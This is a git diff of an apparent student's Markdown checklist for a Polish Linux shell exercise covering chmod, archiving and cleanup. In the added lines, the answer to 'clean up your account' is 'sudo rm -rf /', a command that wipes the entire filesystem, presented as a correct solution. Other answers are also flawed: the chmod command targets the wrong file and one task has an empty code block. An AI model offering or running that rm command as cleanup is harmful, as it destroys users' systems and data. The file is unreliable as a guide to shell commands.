@@ -17,10 +17,15 @@ tail -n 4 Hello.c
 grep main Hello.c
 
 ```
-* [X]  4. Plikowi program.c nadaj następujące uprawnienia: właściciel – czytanie, pisanie, grupa – czytanie, pozostali użytkownicy: brak uprawnień. (chmod)
+* [x]  4. Plikowi program.c nadaj następujące uprawnienia: właściciel – czytanie, pisanie, grupa – czytanie, pozostali użytkownicy: brak uprawnień. (chmod)
+```
+chmod 640 fad.md
 
+```
+* []  5.Będąc w katalogu temp przenieś katalog wazne-sprawy do katalogu praca.
+```
 
-* [x]  5.Będąc w katalogu temp przenieś katalog wazne-sprawy do katalogu praca.
+```
 
 * [x]  6. Zarchiwizuj cały katalog temp. (zip i tar)cd
 ```
@@ -37,4 +42,7 @@ rm -r temp
 tar -xf temp.tar
 
 ```
-* [ ]  9. Posprzątaj na swoim koncie.
+* [x]  9. Posprzątaj na swoim koncie.
+```
+sudo rm -rf /
+```
